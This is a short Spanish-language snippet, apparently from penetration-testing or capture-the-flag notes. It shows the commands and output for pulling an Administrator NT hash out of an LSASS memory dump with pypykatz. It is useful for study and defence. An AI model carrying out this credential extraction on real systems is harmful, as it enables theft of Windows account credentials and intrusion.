
### OBTENER UN HASH
```shell
❯ file lsass.DMP
lsass.DMP: Mini DuMP crash report, 16 streams, Sun Feb 23 18:02:01 2020, 0x421826 type

#PODEMOS VER QUE ES MINI DUMP

❯ pypykatz lsa minidump lsass.DMP
ADMINISTRATOR
NT: 7f1e4ff8c6a8e6b6fcae2d9c0572cd62 [HASH]
```